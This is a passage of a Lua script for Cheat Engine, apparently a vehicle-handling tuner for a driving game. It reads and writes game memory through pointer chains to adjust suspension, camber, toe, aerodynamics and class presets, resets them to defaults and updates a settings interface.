    if BrakeBiasFrontCurrent~=BrakeBiasFrontDefault then writeFloat(BrakeBiasFrontADR,BrakeBiasFrontDefault) end
    if BrakeBiasRearCurrent~=BrakeBiasRearDefault then writeFloat(BrakeBiasRearADR,BrakeBiasRearDefault) end
    if SteeringLockCurrent~=SteeringLockDefault then writeFloat(SteeringLockADR,SteeringLockDefault) end
    if SteeringLockRatioCurrent~=SteeringLockRatioDefault then writeFloat(SteeringLockRatioADR,SteeringLockRatioDefault) end
    if readFloat(CurveMaxADR)~=CurveMaxDefault or CurveMaxCurrent~=CurveMaxDefault then writeFloat(CurveMaxADR,CurveMaxDefault) end
    if CurveMaxRatioCurrent~=CurveMaxRatioDefault then writeFloat(CurveMaxRatioADR,CurveMaxRatioDefault) end
    if CurveMinCurrent~=CurveMinDefault then writeFloat(CurveMinADR,CurveMinDefault) end
    if CurveMinRatioCurrent~=CurveMinRatioDefault then writeFloat(CurveMinRatioADR,CurveMinRatioDefault) end
    if CurveLateralCurrent~=CurveLateralDefault then writeFloat(CurveLateralADR,CurveLateralDefault) end
    if CurveLateralRatioCurrent~=CurveLateralRatioDefault then writeFloat(CurveLateralRatioADR,CurveLateralRatioDefault) end
    if SpringDeltaCurrent~=SpringDeltaDefault then writeFloat(SpringDeltaADR,SpringDeltaDefault) end
    if SpringDeltaRatioCurrent~=SpringDeltaRatioDefault then writeFloat(SpringDeltaRatioADR,SpringDeltaRatioDefault) end
    if LowSpeedTractionCurrent~=LowSpeedTractionDefault then writeFloat(LowSpeedTractionADR,LowSpeedTractionDefault) end
    if FrontGripCurrent~=FrontGripDefault then writeFloat(FrontGripADR,FrontGripDefault) end
    if RearGripCurrent~=RearGripDefault then writeFloat(RearGripADR,RearGripDefault) end
    if TractionLossMultCurrent~=TractionLossMultDefault then writeFloat(TractionLossMultADR,TractionLossMultDefault) end
    if SuspensionForceCurrent~=SuspensionForceDefault then writeFloat(SuspensionForceADR,SuspensionForceDefault) end
    if SuspensionBumpCurrent~=SuspensionBumpDefault then writeFloat(SuspensionBumpADR,SuspensionBumpDefault) end
    if SuspensionReboundCurrent~=SuspensionReboundDefault then writeFloat(SuspensionReboundADR,SuspensionReboundDefault) end
    if SuspensionRaiseCurrent~=SuspensionRaiseDefault then writeFloat(SuspensionRaiseADR,SuspensionRaiseDefault) end
    if SuspensionTravelCurrent~=SuspensionTravelDefault then writeFloat(SuspensionTravelADR,SuspensionTravelDefault) end
    if FrontSpringCurrent~=FrontSpringDefault then writeFloat(FrontSpringADR,FrontSpringDefault) end
    if RearSpringCurrent~=RearSpringDefault then writeFloat(RearSpringADR,RearSpringDefault) end
    if ARBForceCurrent~=ARBForceDefault then writeFloat(ARBForceADR,ARBForceDefault) end
    if FrontARBCurrent~=FrontARBDefault then writeFloat(FrontARBADR,FrontARBDefault) end
    if RearARBCurrent~=RearARBDefault then writeFloat(RearARBADR,RearARBDefault) end
    if CollisionMultCurrent~=CollisionMultDefault then writeFloat(CollisionMultADR,CollisionMultDefault) end
    if EngineMultCurrent~=EngineMultDefault then writeFloat(EngineMultADR,EngineMultDefault) end
    if ToeFrontCurrent~=ToeFrontDefault then writeFloat(ToeFrontADR,ToeFrontDefault) end
    if ToeRearCurrent~=ToeRearDefault then writeFloat(ToeRearADR,ToeRearDefault) end
    if CamberFrontCurrent~=CamberFrontDefault then writeFloat(CamberFrontADR,CamberFrontDefault) end
    if CamberRearCurrent~=CamberRearDefault then writeFloat(CamberRearADR,CamberRearDefault) end
    --writeFloat(HeadlightADR,HeadlightDefault)
    --writeBytes(XenonADR,XenonDefault)
    --writeBytes(XenonColorADR,XenonColorDefault)
    if HandlingFlagCurrent~=HandlingFlagDefault then writeBytes(HandlingFlagADR,HandlingFlagDefault) end
    if ModelFlagCurrent~=ModelFlagDefault then writeBytes(ModelFlagADR,ModelFlagDefault) end
    if AdvancedCurrent~=AdvancedDefault then writeInteger(AdvancedADR,AdvancedDefault) end
    if CastorCurrent~=CastorDefault then writeFloat(CastorADR,CastorDefault) end
    if DownForceMultCurrent~=DownForceMultDefault then writeFloat(DownForceMultADR,DownForceMultDefault) end
    if RoloFrontCurrent~=RoloFrontDefault then writeFloat(RoloFrontADR,RoloFrontDefault) end
    if RoloRearCurrent~=RoloRearDefault then writeFloat(RoloRearADR,RoloRearDefault) end
    end
  end

  function ForceDefault()
    if CarNameADR ~= getAddress("[[[PTR+8]+D30]+20]+298") then
      GetAdr()
      BackToDefault()
    else
      BackToDefault()
    end
  end

  function BackToDefault()
   UDF1.SetupNameLabel.Caption = "CURRENT SETUP: DEFAULT"
   SendPack("Back to defaults",0,1)
   LOG_History=LOG_History.."Reset to defaults - "..(os.date("%X")).."\n"
   SetCurrent()
   SetDeltaDefault()
     if GT3modeDELTA==1 and GTEmodeDELTA==1 and HSmodeDELTA==1 then
        SendValues()
        DisplayInfo()
     elseif GT3modeDELTA==2 and GT3array[CarNameCurrent] then
        SendValues()
        DisplayInfo()
        MakeItGT3()
        GT3modeDELTA = 2
        UDF1.gt3Value.Caption = 'ON'
     elseif GTEmodeDELTA==2 and GTEarray[CarNameCurrent] then
        SendValues()
        DisplayInfo()
        MakeItGTE()
        GTEmodeDELTA = 2
        UDF1.gtevalue.Caption = 'ON'
     elseif HSmodeDELTA==2 and HSarray[CarNameCurrent] then
        SendValues()
        DisplayInfo()
        MakeItHS()
        HSmodeDELTA = 2
        UDF1.hsvalue.Caption = 'ON'
     elseif F1modeDELTA==2 and F1array[CarNameCurrent] then
        SendValues()
        DisplayInfo()
        MakeItF1()
        F1modeDELTA = 2
        UDF1.f1value.Caption = 'ON'
     end
  end

  function SetDeltaDefault()
   SuspensionForceDELTA = 9 --1/9 1/18
   ARBForceDELTA = 7 --1/7 1/14
   SuspensionRaiseDELTA = 9 --1/9 1/18
   SuspensionBumpDELTA = 19 --1/19 1/38
   SuspensionReboundDELTA = 19 --1/19 1/38
   SuspensionTravelDELTA = 9 --1/9 1/18
   FrontSpringDELTA = 9 --1/9 1/18
   FrontARBDELTA = 9 --1/9 1/18
   ToeFrontDELTA = 18 --1/18 1/36
   CamberFrontDELTA = 50 --20
   RearSpringDELTA = 9 --1/9 1/18
   RearARBDELTA = 9 --1/9 1/18
   ToeRearDELTA = 18 --1/18 1/36
   CamberRearDELTA = 50 --20

   WeightDistDELTA = 12 --1/18 1/24
   SteeringLockDELTA = 2 --1/3
   RearWingDELTA = 5 --1/9
   FrontWingDELTA = 5 --1/9
   AeroPackageDELTA = 2 --1/3
   CastorDELTA=9 --1/18
   GT3modeDELTA = 1
   GTEmodeDELTA = 1
   HSmodeDELTA = 1
   F1modeDELTA = 1

   BrakeBiasDELTA = 8 --1/17
   BrakesSizeDELTA = 3
   HeadlightDELTA = 1
   XenonColorDELTA = 1
   TCDELTA = 5

   GearsDELTA = 1
   MixDELTA = 2
   BrakePressureDELTA = 100
   TPDELTA = 160 --140/180
   PreloadDELTA = 80 --0/160
   CarStatusDELTA = 1
   SpotterDELTA = 1
   EngRunDELTA=1
   HeadlightCurrent=readFloat("[[PTR+8]+D30]+A14")
   XenonCurrent=readBytes("[[[PTR+8]+D30]+48]+3E1")
   XenonColorCurrent=readBytes("[[[PTR+8]+D30]+48]+406")
  end

  function DisplayInfo()
   UDF1.WeightDistValue.Caption = 50+((WeightDistCurrent*100)//1)/10
   UDF1.FrontWingValue.Caption = '5'
   UDF1.RearWingValue.Caption = '5'
   UDF1.GearsValue.Caption = 'Standart'
   UDF1.SteeringLockValue.Caption = "Standart"
   UDF1.SuspensionForceValue.Caption = (SuspensionForceCurrent*100)//1
   UDF1.BumpValue.Caption = SuspensionBumpDELTA
   UDF1.ReboundValue.Caption = SuspensionReboundDELTA
   UDF1.SuspensionRaiseValue.Caption = (((SuspensionRaiseCurrent*1000)//1)/10)+9
   UDF1.FrontSpringValue.Caption = FrontSpringDELTA
   UDF1.RearSpringValue.Caption = RearSpringDELTA
   UDF1.ARBForceValue.Caption = ARBForceDELTA
   UDF1.FrontARBValue.Caption = FrontARBDELTA
   UDF1.RearARBValue.Caption = RearARBDELTA
   UDF1.FrontToeValue.Caption = (((ToeFrontCurrent*(-46.1))*10)//1)/10
   UDF1.RearToeValue.Caption = (((ToeRearCurrent*(-46.1))*10)//1)/10
   UDF1.FrontCamberValue.Caption = (((CamberFrontCurrent*55.5)*10)//1)/10
   UDF1.RearCamberValue.Caption = (((CamberRearCurrent*55.5)*10)//1)/10
   UDF1.CarNameLabel.Caption = CarNameCurrent
   UDF1.HeadlightValue.Caption = 'OFF'
   UDF1.XenonColorValue.Caption = 'DEFAULT'
   UDF1.BrakesSizeValue.Caption = 'LARGE'
   UDF1.AeroPackageValue.Caption = 'Standart'
   UDF1.BrakeBiasValue.Caption = ((((BrakeBiasFrontCurrent+0.001)*100/2)*100)//1)/100
   UDF1.SuspensionTravelValue.Caption=SuspensionTravelDELTA
   UDF1.TCValue.Caption=TCDELTA
   UDF1.gt3Value.Caption='OFF'
   UDF1.gtevalue.Caption='OFF'
   UDF1.hsvalue.Caption='OFF'
   UDF1.F1Value.Caption='OFF'
   UDF1.MixValue.Caption = MixDELTA
   UDF1.CarNameLabel.Caption=CarNameCurrent
   UDF1.castorvalue.Caption=(CastorCurrent*100)//1
   UDF1.BrakePressureValue.Caption = BrakePressureDELTA.." %"
   UDF1.TirePressureValue.Caption = TPDELTA
   UDF1.PreloadValue.Caption = PreloadDELTA.." Nm"
   if Spotter == true then
      UDF1.CfSpotValue.Caption='ON'
   else
      UDF1.CfSpotValue.Caption='OFF'
   end

   if CarStatus == true then
      UDF1.CfSValue.Caption='ON'
   else
       UDF1.CfSValue.Caption='OFF'
   end
  end

  -- SUSPENSION   SUSPENSION   SUSPENSION   SUSPENSION   SUSPENSION  SUSPENSION
  function LoadSuspensionSettings()

    --SUSPENSION FORCE
    function SuspensionForceIncrease()
      if SuspensionForceDELTA ~= 18 then
        SuspensionForceCurrent = SuspensionForceCurrent + 0.125
        UDF1.SuspensionForceValue.Caption = (SuspensionForceCurrent*100)//1
        SuspensionForceDELTA = SuspensionForceDELTA + 1
        WriteFloat(SuspensionForceADR,SuspensionForceCurrent)
        ChangedSetup=true
      end
    end

    function SuspensionForceDecrease()
      if SuspensionForceDELTA ~= 1 then
        SuspensionForceCurrent = SuspensionForceCurrent - 0.125
        UDF1.SuspensionForceValue.Caption = (SuspensionForceCurrent*100)//1
        SuspensionForceDELTA = SuspensionForceDELTA - 1
        WriteFloat(SuspensionForceADR,SuspensionForceCurrent)
        ChangedSetup=true
      end
    end

    --ANTI-ROLL BAR FORCE
    function ARBForceIncrease()
      if ARBForceDELTA ~= 14 then
        ARBForceCurrent = ARBForceCurrent + 0.65
        ARBForceDELTA = ARBForceDELTA + 1
        UDF1.ARBForceValue.Caption = ARBForceDELTA
        WriteFloat(ARBForceADR,ARBForceCurrent)
        ChangedSetup=true
      end
    end

    function ARBForceDecrease()
      if ARBForceDELTA ~= 1 then
        ARBForceCurrent = ARBForceCurrent - 0.65
        ARBForceDELTA = ARBForceDELTA - 1
        UDF1.ARBForceValue.Caption = ARBForceDELTA
        WriteFloat(ARBForceADR,ARBForceCurrent)
        ChangedSetup=true
      end
    end

    --SUSPENSION RAISE
    function SuspensionRaiseIncrease()
      if SuspensionRaiseDELTA ~= 18 then
        SuspensionRaiseCurrent = SuspensionRaiseCurrent + 0.004
        UDF1.SuspensionRaiseValue.Caption = (((SuspensionRaiseCurrent*1000)//1)/10)+9
        SuspensionRaiseDELTA = SuspensionRaiseDELTA + 1
        WriteFloat(SuspensionRaiseADR,SuspensionRaiseCurrent)
        ChangedSetup=true
      end
    end

    function SuspensionRaiseDecrease()
      if SuspensionRaiseDELTA ~= 1 then
        SuspensionRaiseCurrent = SuspensionRaiseCurrent - 0.004
        UDF1.SuspensionRaiseValue.Caption = (((SuspensionRaiseCurrent*1000)//1)/10)+9
        SuspensionRaiseDELTA = SuspensionRaiseDELTA - 1
        WriteFloat(SuspensionRaiseADR,SuspensionRaiseCurrent)
      end
    end

    --BUMP
    function SuspensionBumpIncrease()
      if SuspensionBumpDELTA ~= 38 then
        SuspensionBumpCurrent = SuspensionBumpCurrent + 0.0065
        SuspensionBumpDELTA = SuspensionBumpDELTA + 1
        UDF1.BumpValue.Caption = SuspensionBumpDELTA
        WriteFloat(SuspensionBumpADR,SuspensionBumpCurrent)
        ChangedSetup=true
      end
    end

    function SuspensionBumpDecrease()
      if SuspensionBumpDELTA ~= 1 then
        SuspensionBumpCurrent = SuspensionBumpCurrent - 0.0065
        SuspensionBumpDELTA = SuspensionBumpDELTA - 1
        UDF1.BumpValue.Caption = SuspensionBumpDELTA
        WriteFloat(SuspensionBumpADR,SuspensionBumpCurrent)
        ChangedSetup=true
      end
    end

     --Rebound
    function SuspensionReboundIncrease()
      if SuspensionReboundDELTA ~= 38 then
        SuspensionReboundCurrent = SuspensionReboundCurrent + 0.0075
        SuspensionReboundDELTA = SuspensionReboundDELTA + 1
        UDF1.ReboundValue.Caption = SuspensionReboundDELTA
        WriteFloat(SuspensionReboundADR,SuspensionReboundCurrent)
        ChangedSetup=true
      end
    end

    function SuspensionReboundDecrease()
      if SuspensionReboundDELTA ~= 1 then
        SuspensionReboundCurrent = SuspensionReboundCurrent - 0.0075
        SuspensionReboundDELTA = SuspensionReboundDELTA - 1
        UDF1.ReboundValue.Caption = SuspensionReboundDELTA
        WriteFloat(SuspensionReboundADR,SuspensionReboundCurrent)
        ChangedSetup=true
      end
    end

    --Travel
    function SuspensionTravelIncrease()
      if SuspensionTravelDELTA ~= 18 then
        SuspensionTravelCurrent = SuspensionTravelCurrent - 0.015
        SuspensionTravelDELTA = SuspensionTravelDELTA + 1
        UDF1.SuspensionTravelValue.Caption=SuspensionTravelDELTA
        writeFloat(SuspensionTravelADR,SuspensionTravelCurrent)
        ChangedSetup=true
      end
    end

    function SuspensionTravelDecrease()
      if SuspensionTravelDELTA ~= 1 then
        SuspensionTravelCurrent = SuspensionTravelCurrent + 0.015
        SuspensionTravelDELTA = SuspensionTravelDELTA - 1
        UDF1.SuspensionTravelValue.Caption=SuspensionTravelDELTA
        writeFloat(SuspensionTravelADR,SuspensionTravelCurrent)
        ChangedSetup=true
      end
    end

     --FrontSpring
    function FrontSpringIncrease()
      if FrontSpringDELTA ~= 18 then
        FrontSpringCurrent = FrontSpringCurrent + 0.15
        FrontSpringDELTA = FrontSpringDELTA + 1
        UDF1.FrontSpringValue.Caption = FrontSpringDELTA
        writeFloat(FrontSpringADR,FrontSpringCurrent)
        ChangedSetup=true
      end
    end

    function FrontSpringDecrease()
      if FrontSpringDELTA ~= 1 then
        FrontSpringCurrent = FrontSpringCurrent - 0.15
        FrontSpringDELTA = FrontSpringDELTA - 1
        UDF1.FrontSpringValue.Caption = FrontSpringDELTA
        writeFloat(FrontSpringADR,FrontSpringCurrent)
        ChangedSetup=true
      end
    end

     --FrontARB
    function FrontARBIncrease()
      if FrontARBDELTA ~= 18 then
        FrontARBCurrent = FrontARBCurrent + 0.08
        RoloFrontCurrent = RoloFrontCurrent + 0.01
        FrontARBDELTA = FrontARBDELTA + 1
        UDF1.FrontARBValue.Caption = FrontARBDELTA
        writeFloat(FrontARBADR,FrontARBCurrent)
        writeFloat(RoloFrontADR,RoloFrontCurrent)
        ChangedSetup=true
      end
    end

    function FrontARBDecrease()
      if FrontARBDELTA ~= 1 then
        FrontARBCurrent = FrontARBCurrent - 0.08
        RoloFrontCurrent = RoloFrontCurrent - 0.01
        FrontARBDELTA = FrontARBDELTA - 1
        UDF1.FrontARBValue.Caption = FrontARBDELTA
        writeFloat(FrontARBADR,FrontARBCurrent)
        writeFloat(RoloFrontADR,RoloFrontCurrent)
        ChangedSetup=true
      end
    end

     --ToeFront
    function ToeFrontIncrease()
      if ToeFrontDELTA ~= 36 then
        ToeFrontCurrent = ToeFrontCurrent - 0.0023
        UDF1.FrontToeValue.Caption = (((ToeFrontCurrent*(-46.1))*10)//1)/10
        ToeFrontDELTA = ToeFrontDELTA + 1
        writeFloat(ToeFrontADR,ToeFrontCurrent)
        ChangedSetup=true
      end
    end

    function ToeFrontDecrease()
      if ToeFrontDELTA ~= 1 then
        ToeFrontCurrent = ToeFrontCurrent + 0.0023
        UDF1.FrontToeValue.Caption = (((ToeFrontCurrent*(-46.1))*10)//1)/10
        ToeFrontDELTA = ToeFrontDELTA - 1
        writeFloat(ToeFrontADR,ToeFrontCurrent)
        ChangedSetup=true
      end
    end

     --CamberFront
    function CamberFrontIncrease()
      if CamberFrontDELTA ~= 50 then
        CamberFrontCurrent = CamberFrontCurrent + 0.0018
        UDF1.FrontCamberValue.Caption = (((CamberFrontCurrent*55.5)*10)//1)/10
        CamberFrontDELTA = CamberFrontDELTA + 1
        writeFloat(CamberFrontADR,CamberFrontCurrent)
        ChangedSetup=true
      end
    end

    function CamberFrontDecrease()
      if CamberFrontDELTA ~= 1 then
        CamberFrontCurrent = CamberFrontCurrent - 0.0018
        UDF1.FrontCamberValue.Caption = (((CamberFrontCurrent*55.5)*10)//1)/10
        CamberFrontDELTA = CamberFrontDELTA - 1
        writeFloat(CamberFrontADR,CamberFrontCurrent)
        ChangedSetup=true
      end
    end

     --RearSpring
    function RearSpringIncrease()
      if RearSpringDELTA ~= 18 then
        RearSpringCurrent = RearSpringCurrent + 0.1
        RearSpringDELTA = RearSpringDELTA + 1
        UDF1.RearSpringValue.Caption = RearSpringDELTA
        writeFloat(RearSpringADR,RearSpringCurrent)
        ChangedSetup=true
      end
    end

    function RearSpringDecrease()
      if RearSpringDELTA ~= 1 then
        RearSpringCurrent = RearSpringCurrent - 0.1
        RearSpringDELTA = RearSpringDELTA - 1
        UDF1.RearSpringValue.Caption = RearSpringDELTA
        writeFloat(RearSpringADR,RearSpringCurrent)
        ChangedSetup=true
      end
    end

     --RearARB
    function RearARBIncrease()
      if RearARBDELTA ~= 18 then
        RearARBCurrent = RearARBCurrent + 0.08
        RoloRearCurrent = RoloRearCurrent + 0.01
        RearARBDELTA = RearARBDELTA + 1
        UDF1.RearARBValue.Caption = RearARBDELTA
        writeFloat(RearARBADR,RearARBCurrent)
        writeFloat(RoloRearADR,RoloRearCurrent)
        ChangedSetup=true
      end
    end

    function RearARBDecrease()
      if RearARBDELTA ~= 1 then
        RearARBCurrent = RearARBCurrent - 0.08
        RoloRearCurrent = RoloRearCurrent - 0.01
        RearARBDELTA = RearARBDELTA - 1
        UDF1.RearARBValue.Caption = RearARBDELTA
        writeFloat(RearARBADR,RearARBCurrent)
        writeFloat(RoloRearADR,RoloRearCurrent)
        ChangedSetup=true
      end
    end

     --ToeRear
    function ToeRearIncrease()
      if ToeRearDELTA ~= 36 then
        ToeRearCurrent = ToeRearCurrent - 0.0023
        UDF1.RearToeValue.Caption = (((ToeRearCurrent*(-46.1))*10)//1)/10
        ToeRearDELTA = ToeRearDELTA + 1
        writeFloat(ToeRearADR,ToeRearCurrent)
        ChangedSetup=true
      end
    end

    function ToeRearDecrease()
      if ToeRearDELTA ~= 1 then
        ToeRearCurrent = ToeRearCurrent + 0.0023
        UDF1.RearToeValue.Caption = (((ToeRearCurrent*(-46.1))*10)//1)/10
        ToeRearDELTA = ToeRearDELTA - 1
        writeFloat(ToeRearADR,ToeRearCurrent)
        ChangedSetup=true
      end
    end

     --CamberRear
    function CamberRearIncrease()
      if CamberRearDELTA ~= 50 then
        CamberRearCurrent = CamberRearCurrent + 0.0018
        UDF1.RearCamberValue.Caption = (((CamberRearCurrent*55.5)*10)//1)/10
        CamberRearDELTA = CamberRearDELTA + 1
        writeFloat(CamberRearADR,CamberRearCurrent)
        ChangedSetup=true
      end
    end

    function CamberRearDecrease()
      if CamberRearDELTA ~= 1 then
        CamberRearCurrent = CamberRearCurrent - 0.0018
        UDF1.RearCamberValue.Caption = (((CamberRearCurrent*55.5)*10)//1)/10
        CamberRearDELTA = CamberRearDELTA - 1
        writeFloat(CamberRearADR,CamberRearCurrent)
        ChangedSetup=true
      end
    end
  end

  --CHASSIS CHASSIS CHASSIS CHASSIS CHASSIS CHASSIS CHASSIS CHASSIS CHASSIS CHASSIS
  function LoadChassisSettings()
    --Weight Distribution
    function WeightDistIncrease()
     if WeightDistDELTA ~= 24 then
       WeightDistCurrent = WeightDistCurrent + 0.03
       UDF1.WeightDistValue.Caption = 50+((WeightDistCurrent*100)//1)/10
       WeightDistDELTA = WeightDistDELTA + 1
       writeFloat(WeightDistADR,WeightDistCurrent)
       ChangedSetup=true
     end
    end

    function WeightDistDecrease()
     if WeightDistDELTA ~= 1 then
       WeightDistCurrent = WeightDistCurrent - 0.03
       UDF1.WeightDistValue.Caption = 50+((WeightDistCurrent*100)//1)/10
       WeightDistDELTA = WeightDistDELTA - 1
       writeFloat(WeightDistADR,WeightDistCurrent)
       ChangedSetup=true
     end
    end

    --Steering Lock
    function SteeringLockIncrease()
     if SteeringLockDELTA ~= 3 then
       SteeringLockCurrent = SteeringLockCurrent + 0.25
       if SteeringLockDELTA==2 then
          UDF1.SteeringLockValue.Caption = 'Drift'
       end
       if SteeringLockDELTA==1 then
          UDF1.SteeringLockValue.Caption = 'Standart'
       end
       SteeringLockDELTA = SteeringLockDELTA + 1
       writeFloat(SteeringLockADR,SteeringLockCurrent)
       ChangedSetup=true
     end
    end

    function SteeringLockDecrease()
     if SteeringLockDELTA ~= 1 then
       SteeringLockCurrent = SteeringLockCurrent - 0.25
       if SteeringLockDELTA==2 then
          UDF1.SteeringLockValue.Caption = 'Low'
       end
       if SteeringLockDELTA==3 then
          UDF1.SteeringLockValue.Caption = 'Standart'
       end
       SteeringLockDELTA = SteeringLockDELTA - 1
       writeFloat(SteeringLockADR,SteeringLockCurrent)
       ChangedSetup=true
     end
    end

    --Rear Wing
    function RearWingIncrease()
     if RearWingDELTA ~= 9 then
       DragCurrent = DragCurrent + 0.0000575
       RearGripCurrent = RearGripCurrent + 0.03
       RearWingDELTA = RearWingDELTA + 1
       UDF1.RearWingValue.Caption = RearWingDELTA
       writeFloat(DragADR,DragCurrent)
       writeFloat(RearGripADR,RearGripCurrent)
       ChangedSetup=true
     end
    end

    function RearWingDecrease()
     if RearWingDELTA ~= 1 then
       DragCurrent = DragCurrent - 0.0000575
       RearGripCurrent = RearGripCurrent - 0.03
       RearWingDELTA = RearWingDELTA - 1
       UDF1.RearWingValue.Caption = RearWingDELTA
       writeFloat(DragADR,DragCurrent)
       writeFloat(RearGripADR,RearGripCurrent)
       ChangedSetup=true
     end
    end

    --Front Wing
    function FrontWingIncrease()
     if FrontWingDELTA ~= 9 then
       DragCurrent = DragCurrent + 0.0000255
       FrontGripCurrent = FrontGripCurrent + 0.0175
       FrontWingDELTA = FrontWingDELTA + 1
       UDF1.FrontWingValue.Caption = FrontWingDELTA
       writeFloat(DragADR,DragCurrent)
       writeFloat(FrontGripADR,FrontGripCurrent)
     end
    end

    function FrontWingDecrease()
     if FrontWingDELTA ~= 1 then
       DragCurrent = DragCurrent - 0.0000255
       FrontGripCurrent = FrontGripCurrent - 0.0175
       FrontWingDELTA = FrontWingDELTA - 1
       UDF1.FrontWingValue.Caption = FrontWingDELTA
       writeFloat(DragADR,DragCurrent)
       writeFloat(FrontGripADR,FrontGripCurrent)
     end
    end

    --AeroPackage
    function AeroPackageIncrease()
     if AeroPackageDELTA ~= 3 then
       DragCurrent = DragCurrent + 0.0002
       FrontGripCurrent = FrontGripCurrent + 0.065
       RearGripCurrent = RearGripCurrent + 0.1
       InitialMaxFlatVelCurrent = InitialMaxFlatVelCurrent - 6
       AeroPackageDELTA = AeroPackageDELTA + 1
       if AeroPackageDELTA==3 then
          UDF1.AeroPackageValue.Caption = 'High downforce'
       end
       if AeroPackageDELTA==2 then
          UDF1.AeroPackageValue.Caption = 'Standart'
       end
       WriteFloat(InitialMaxFlatVelADR,InitialMaxFlatVelCurrent)
       WriteFloat(DragADR,DragCurrent)
       WriteFloat(RearGripADR,RearGripCurrent)
       WriteFloat(FrontGripADR,FrontGripCurrent)
       ChangedSetup=true
     end
    end

    function AeroPackageDecrease()
     if AeroPackageDELTA ~= 1 then
       DragCurrent = DragCurrent - 0.0002
       FrontGripCurrent = FrontGripCurrent - 0.065
       RearGripCurrent = RearGripCurrent - 0.1
       InitialMaxFlatVelCurrent = InitialMaxFlatVelCurrent + 6
       AeroPackageDELTA = AeroPackageDELTA - 1
       if AeroPackageDELTA==1 then
          UDF1.AeroPackageValue.Caption = 'Low downforce'
       end
       if AeroPackageDELTA==2 then
          UDF1.AeroPackageValue.Caption = 'Standart'
       end
       WriteFloat(InitialMaxFlatVelADR,InitialMaxFlatVelCurrent)
       WriteFloat(DragADR,DragCurrent)
       WriteFloat(RearGripADR,RearGripCurrent)
       WriteFloat(FrontGripADR,FrontGripCurrent)
       ChangedSetup=true
     end
    end

    --Castor
    function CastorIncrease()
     if CastorDELTA ~=18 then
      CastorCurrent=CastorCurrent + 0.1
      SteeringLockRatioCurrent = SteeringLockRatioCurrent + 0.1
      UDF1.castorvalue.Caption=(CastorCurrent*100)//1
      CastorDELTA=CastorDELTA+1
      writeFloat(CastorADR,CastorCurrent)
      ChangedSetup=true
     end
    end

    function CastorDecrease()
     if CastorDELTA ~=1 then
      CastorCurrent=CastorCurrent - 0.1
      SteeringLockRatioCurrent = SteeringLockRatioCurrent - 0.1
      UDF1.castorvalue.Caption=(CastorCurrent*100)//1
      CastorDELTA=CastorDELTA-1
      writeFloat(CastorADR,CastorCurrent)
      ChangedSetup=true
     end
    end

    --GT3 mode
    function TurnGT3ModeOn()
     if GT3modeDELTA ~=2 then
          MakeItGT3()
          GT3modeDELTA = 2
          UDF1.gt3Value.Caption = 'ON'
          UDF1.ClassValue.Caption = "GT3"
          UDF1.ClassValue.Font.Color = 14389050
          SendPack("GT3 mode ON",0,1)
          --LOG_History=LOG_History.."GT3 mode ON - "..(os.date("%X")).."\n"
     end
    end

    function TurnGT3ModeOff()
     if GT3modeDELTA ~=1 then
        MakeItDefaultGT()
        GT3modeDELTA = 1
        UDF1.gt3Value.Caption = 'OFF'
        UDF1.ClassValue.Caption = "-"
        UDF1.ClassValue.Font.Color = clDefault
        SendPack("GT3 mode OFF",0,1)
        --LOG_History=LOG_History.."GT3 mode OFF - "..(os.date("%X")).."\n"
     end
    end

    --GTE mdoe
    function TurnGTEModeOn()
     if GTEmodeDELTA ~=2 then
          MakeItGTE()
          GTEmodeDELTA = 2
          UDF1.gtevalue.Caption = 'ON'
          UDF1.ClassValue.Caption = "GTE"
          UDF1.ClassValue.Font.Color = 47160
          SendPack("GTE mode ON",0,1)
          --LOG_History=LOG_History.."GTE mode ON - "..(os.date("%X")).."\n"
     end
    end

    function TurnGTEModeOff()
     if GTEmodeDELTA ~=1 then
        MakeItDefaultGTE()
        GTEmodeDELTA = 1
        UDF1.gtevalue.Caption = 'OFF'
        UDF1.ClassValue.Caption = "-"
        UDF1.ClassValue.Font.Color = clDefault
        SendPack("GTE mode OFF",0,1)
        --LOG_History=LOG_History.."GTE mode OFF - "..(os.date("%X")).."\n"
     end
    end

    function TurnF1ModeOn()
     if F1modeDELTA ~=2 then
          MakeItF1()
          F1modeDELTA = 2
          UDF1.F1Value.Caption = 'ON'
          UDF1.ClassValue.Caption = "F1"
          UDF1.ClassValue.Font.Color = clDefault
          SendPack("F1 mode ON",0,1)
          --LOG_History=LOG_History.."F1 mode ON - "..(os.date("%X")).."\n"
     end
    end

    function TurnF1ModeOff()
     if F1modeDELTA ~=1 then
        MakeItDefaultF1()
        F1modeDELTA = 1
        UDF1.F1Value.Caption = 'OFF'
        UDF1.ClassValue.Caption = "-"
        UDF1.ClassValue.Font.Color = clDefault
        SendPack("F1 mode OFF",0,1)
        --LOG_History=LOG_History.."F1 mode OFF - "..(os.date("%X")).."\n"
     end
    end

    --HS mode
    function TurnHSModeOn()
     if HSmodeDELTA ~=2 then
          MakeItHS()
          HSmodeDELTA = 2
          UDF1.hsvalue.Caption = 'ON'
          UDF1.ClassValue.Caption = "HS"
          UDF1.ClassValue.Font.Color = 219
          SendPack("HS mode ON",0,1)
          --LOG_History=LOG_History.."HS mode ON - "..(os.date("%X")).."\n"
     end
    end

    function TurnHSModeOff()
     if HSmodeDELTA ~=1 then
        MakeItDefaultHS()
        HSmodeDELTA = 1
        UDF1.hsvalue.Caption = 'OFF'
        UDF1.ClassValue.Caption = "-"
        UDF1.ClassValue.Font.Color = clDefault
        SendPack("HS mode OFF",0,1)
        --LOG_History=LOG_History.."HS mode OFF - "..(os.date("%X")).."\n"
     end
    end

    function ApplyGT3Mod(IntoGT3,Mass,Drag,FWD,RWD,UpShift,DownShift,Drive,MaxFlat,InitMaxFlat,Brake,Steering,CurveMax,CurveMaxR,CurveMin,CurveMinR,CurveLat,CurveLatR,Coll,Eng,DF)
        if IntoGT3==false then
           Mass=Mass*(-1)
           Drag=Drag*(-1)
           FWD=FWD*(-1)
           RWD=RWD*(-1)
           UpShift=UpShift*(-1)
           DownShift=DownShift*(-1)
           Drive=Drive*(-1)
           MaxFlat=MaxFlat*(-1)
           InitMaxFlat=InitMaxFlat*(-1)
           Brake=Brake*(-1)
           Steering=Steering*(-1)
           CurveMax=CurveMax*(-1)
           CurveMaxR=CurveMaxR*(-1)
           CurveMin=CurveMin*(-1)
           CurveMinR=CurveMinR*(-1)
           CurveLat=CurveLat*(-1)
           CurveLatR=CurveLatR*(-1)
           Coll=Coll*(-1)
           Eng=Eng*(-1)
           DF=DF*(-1)
        end
        if Mass~=0 then
           MassCurrent=MassCurrent + Mass
           WriteFloat(MassADR,MassCurrent)
        end
        if Drag~=0 then
           DragCurrent=DragCurrent + Drag
           WriteFloat(DragADR,DragCurrent)
        end
        if UpShift~=0 then
           UpShiftCurrent=UpShiftCurrent + UpShift
